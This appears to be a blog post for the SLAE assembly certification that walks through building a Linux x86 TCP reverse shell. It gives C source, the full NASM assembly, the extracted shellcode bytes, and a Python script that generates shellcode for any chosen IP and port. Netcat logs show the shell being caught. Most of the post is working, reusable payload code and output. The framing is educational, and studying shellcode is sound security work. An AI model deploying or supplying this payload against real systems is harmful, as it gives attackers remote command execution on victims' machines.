---
layout: post
title: Linux x86 TCP Reverse Shell
tags: [slae]
---

This is the second assignment for the SLAE which is the Linux x86 TCP Reverse Shell. This one will actually be less complex than the bind shell as there are less things to do.. I break down the code pretty thoroughly in the bind shell write up, so this one won't be as detailed due to a lot of the code being the same. You can check out the bind shell write up [here](https://www.sploitspren.com/2018-04-10-Linux-x86-TCP-Bind-Shell/).

To kick things off I've modified our existing bind shell C code to instead send a reverse shell. I also updated the dup2() portion to loop in the code to make things a bit cleaner. 

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	// Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP 
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set connect port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(1234);

	// IP to connect to, set to network byte order by inet_addr
	host_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	
	// Connect socket (man connect)
	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
		
	// Loop to redirect STDIN, STDOUT, and STDERR
	int i;
	for(i=0; i<=2; i++) 
		dup2(host_sock, i);
	
	// Execute /bin/sh (man execve)
	execve("/bin/sh", NULL, NULL);

}
```

Let's quickly compile and test the code, starting a netcat listener to catch the shell.

```
absolomb@ubuntu:~/SLAE/assignments/2$ gcc reverseshell.c -o reverseshell
absolomb@ubuntu:~/SLAE/assignments/2$ ./reverseshell
```

```
absolomb@ubuntu:~$ nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 60270)
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Now we can begin by breaking down the C code into basically four sections to help port to Assembly.

- Creating a socket
- Connecting to an IP and port
- Redirecting STDIN, STDOUT, and STDERR
- Executing the shell

As you can see there are less things to do this time around compared to the bind shell, so we should have less assembly to write.

## Creating a Socket

We pretty much need to do exactly what we did for our bind shell code here, so I won't go into details on finding syscall numbers from the Linux header files. Check the previous post for that. 

This time around however we'll be using some different instructions to get some of the same tasks done, and a little more efficiently. 

Instead of XOR'ing registers to zero them out and then using MOV instructions we can instead PUSH the value we want in the register to the stack and POP it into the register after.

This allows us to setup our first two arguments for setting up the socket in EAX and EBX as follows. 

```nasm
push 0x66 		; 
pop eax			; socketcall (102) and clean eax
push 0x1		;
pop ebx			; SYS_SOCKET (1) and clean ebx
```

0x66 being the socketcall() syscall and 0x1 the SYS_SOCKET argument. This trick won't work if we need 0's in a register because of the nulls it creates, so for ECX we will simply XOR itself and push that value to the stack for the 0 we need. 

The rest of the code should be familiar if you followed along in the bind shell write up.

```nasm
xor ecx, ecx		; zero out ecx
push ecx		; protocol (0)
push ebx		; SOCK_STREAM (1)
push 0x2		; AF_INET (2)
mov ecx, esp		; point ecx to top of stack
int 0x80		; execute socket

mov edi, eax		; move socket to edi
```

## Connect to an IP and Port

This will essentially be the same setup as bind() except we'll be replacing the socketcall() argument from SYS_BIND to SYS_CONNECT. Instead of specifying INADDRY_ANY we'll need to specify a real IP address. For testing purposes this will be our loopback address. However there is a catch.

```python
>>> import socket
>>> socket.inet_aton('127.0.0.1')
b'\x7f\x00\x00\x01'
```

As you can see our loopback address contains nulls in it, which will break our shellcode. To work around this we can use the loopback address of 127.1.1.1.

```python
>>> socket.inet_aton('127.1.1.1')
b'\x7f\x01\x01\x01'
```

Remember this address needs to be pushed in reverse, so our final hex for our IP address will be 0x0101017f. The rest of the instructions are essentially the same as the bind shell code.

```nasm
mov al, 0x66		; socketcall (102)
pop ebx			; (2)
push 0x0101017f		; s_addr = 127.1.1.1 
push word 0xd204	; sin_port = 1234
push bx			; AF_INET (2)
mov ecx, esp		; point ecx to top of stack
push 0x10		; sizeof(host_addr)
push ecx		; pointer to host_addr struct
push edi		; socketfd
mov ecx, esp		; point ecx to top of stack 
inc ebx			; SYS_CONNECT (3)
int 0x80		; execute connect
```

## Redirect STDIN, STDOUT, STDERR

Again we'll need to redirect STDIN, STDOUT, and STDERR. We'll once again utilize a loop to accomplish this, the only difference here is the utilization of the PUSH and POP technique to get the desired counter value in ECX.

```nasm
	xchg ebx, edi           ; move socketfd into ebx for dup2
	push 0x2
	pop ecx			; zero out ecx
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set
```

## Executing a Shell

No changes here, it's exactly the same process as before with the bind shell.

```nasm
xor edx, edx		; zero out edx
push edx		; NULL
push 0x68732f2f		; "hs//"
push 0x6e69622f 	; "nib/"
mov ebx, esp		; point ebx to stack
mov ecx, edx		; NULL
mov al, 0xb		; execve
int 0x80		; execute execve
```

## Final Assembly Code

```nasm
global _start

section .text
_start:

	
	; Create the socket

	push 0x66 		; 
	pop eax			; socketcall (102) and clean eax
	push 0x1		;
	pop ebx			; SYS_SOCKET (1) and clean ebx
	xor ecx, ecx		; zero out ecx
	push ecx		; protocol (0)
	push ebx		; SOCK_STREAM (1)
	push 0x2		; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	int 0x80		; execute socket

	mov edi, eax		; move socket to edi


	; Connect to an IP and port

	
	mov al, 0x66		; socketcall (102)
	pop ebx			; (2)
	push 0x0101017f		; s_addr = 127.1.1.1 
	push word 0xd204	; sin_port = 1234
	push bx			; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	push 0x10		; sizeof(host_addr)
	push ecx		; pointer to host_addr struct
	push edi		; socketfd
	mov ecx, esp		; point ecx to top of stack 
	inc ebx			; SYS_CONNECT (3)
	int 0x80		; execute connect
	

	; Redirect STDIN, STDERR, STDOUT

	xchg ebx, edi           ; move socketfd into ebx for dup2
	push 0x2
	pop ecx			; zero out ecx
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh
	
	xor edx, edx		; zero out edx
	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve
```

## Testing the Code

We'll quickly compile and test execution, catching the shell with a netcat listener.

```
absolomb@ubuntu:~/SLAE/assignments/2$ ./compile.sh reverse_shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
absolomb@ubuntu:~/SLAE/assignments/2$ ./reverse_shell
```
```
absolomb@ubuntu:~/SLAE/assignments/2$ nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 34028)
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Success!

Now to extract the shellcode with objdump.

```
absolomb@ubuntu:~/SLAE/assignments/2$ for i in $(objdump -d reverse_shell |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x87\xdf\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80
```

We can put our shellcode in our simple C wrapper program, compile without stack protection, and execute and catch the shell with netcat.

```
absolomb@ubuntu:~/SLAE/assignments/2$ vim shellcode.c 
absolomb@ubuntu:~/SLAE/assignments/2$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstackabsolomb@ubuntu:~/SLAE/assignments/2$ ./shellcode
Shellcode Length:  76
```

```
absolomb@ubuntu:~/SLAE/assignments/2$ nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 34030)
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

## Python Script for Configurable IP and Port

To make the IP address and port configurable some additions were made to the existing bind python script for the IP address. 

```python
#!/usr/bin/env python3
import sys
import struct
import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip")
parser.add_argument('-p', "--port")
args = parser.parse_args()


if (args.ip == None) or (args.port == None):
    parser.print_help()
    parser.exit()

port = int(args.port)
ip = args.ip

if port > 65535:
    print("Please enter a valid port number!")
    exit()

if port < 1024:
    print("You'll need to be root to use this port!")


port = struct.pack("!H", port)
port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))

ip = socket.inet_aton(ip)
ip = str(ip).lstrip("b'")
ip = ip.rstrip("'")

if "\\x00" in ip:
    print(" Nulls in selected IP address!")
    exit()
if "\\x00" in port:
    print(" Nulls in selected port!")
    exit() 

shellcode = """
\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xc9
\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80
\\x89\\xc7\\xb0\\x66\\x5b\\x68%s
\\x66\\x68%s
\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57
\\x89\\xe1\\x43\\xcd\\x80\\x87\\xdf\\x6a
\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79
\\xf9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73
\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3
\\x89\\xd1\\xb0\\x0b\\xcd\\x80
""" % (ip, port)

print ("Shellcode:")
print(shellcode.replace("\n", ""))
```

Now let's test with a different IP address and Port.

```
absolomb@ubuntu:~/SLAE/assignments/2$ python3 reverse.py -i 192.168.1.10 -p 4444
Shellcode:
\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x68\xc0\xa8\x01\n\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x87\xdf\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80
absolomb@ubuntu:~/SLAE/assignments/2$ vim shellcode.c
absolomb@ubuntu:~/SLAE/assignments/2$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
absolomb@ubuntu:~/SLAE/assignments/2$ ./shellcode
Shellcode Length:  76
```

```
absolomb@ubuntu:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.1.10] port 4444 [tcp/*] accepted (family 2, sport 34192)
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Success! Note that you won't be able to use certain IP addresses due to nulls, however the script will check and tell you. 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>